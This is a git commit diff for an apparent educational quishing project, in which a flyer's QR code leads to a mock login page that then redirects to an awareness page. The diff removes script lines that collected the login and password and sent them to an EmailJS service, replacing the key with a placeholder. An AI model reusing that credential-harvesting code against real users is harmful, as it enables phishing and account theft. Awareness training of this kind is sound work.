a3fd7d8d2b9be8d4644adc990c8e6dfa9372e9ee
Thomas CHOPIN <email@exemple.com>
2024-12-10 17:02:42 +0100

    safe version

--- README.md
+++ README.md
@@ -1,1 +1,33 @@
-# QrCode
+# Quishing:
+
+This project aims to help users recognize malicious QR codes and learn how to stay safe from phishing attacks that exploit QR code vulnerabilities.
+
+## Technologies Used :computer:
+
+-   HTML :blue_book:
+-   EmailJS :email:
+-   CSS :art:
+
+## Installation :wrench:
+
+1. Clone the repository: `git clone https://github.com/thomas91600/Quishing.git`
+2. Install dependencies: `npm install`
+3. Start the development server: `npm run deploy`
+4. Open the flyer.png.
+
+## Usage :bulb:
+
+This website is divided into several sections:
+
+-   **About the Flyer**: A promotional flyer with a QR code that simulates a phishing attempt.
+-   **Phishing Mechanism**: The QR code leads to a page requesting credentials for educational purposes.
+-   **Cybersecurity Awareness**: Users are redirected to a page teaching how to identify phishing attacks.
+-   **Email Simulation**: The system simulates email phishing, but sending emails is disabled for legal reasons.
+
+## Contributing :handshake:
+
+If you find a bug or have a suggestion for improvement, feel free to open an issue or submit a pull request.
+
+## License :scroll:
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
--- site_web/script.js
+++ site_web/script.js
@@ -1,25 +1,14 @@
 // Initialisation d'EmailJS avec la public key
 (function () {
-  emailjs.init("DtrKhhGUXAMfuluK9"); // Remplace par ta public key EmailJS
+  emailjs.init("YOUR_KEY"); // Remplace par ta public key EmailJS
 })();
 
-// Écouteur d'événements pour soumettre le formulaire
+  // Écouteur d'événements pour soumettre le formulaire
 document
-  .getElementById("contact-form")
-  .addEventListener("submit", function (event) {
-    event.preventDefault(); // Empêche l'envoi classique du formulaire
+.getElementById("contact-form")
+.addEventListener("submit", function (event) {
+  event.preventDefault(); // Empêche l'envoi classique du formulaire
 
-    // Récupérer les valeurs du formulaire
-    const login = document.getElementById("login").value;
-    const password = document.getElementById("password").value;
-
-    // Envoi des données via EmailJS
-    emailjs
-      .send("service_7lecviq", "template_rxcfoy3", {
-        login: login,
-        password: password,
-      })
-      .then(function (response) {
-        window.location.href = "https://www.cybermalveillance.gouv.fr/tous-nos-contenus/actualites/quishing-hameconnage-qr-code";
-      });
-  });
+  // Ici, tu peux effectuer une redirection sans utiliser EmailJS
+  window.location.href = "https://www.cybermalveillance.gouv.fr/tous-nos-contenus/actualites/quishing-hameconnage-qr-code";
+});
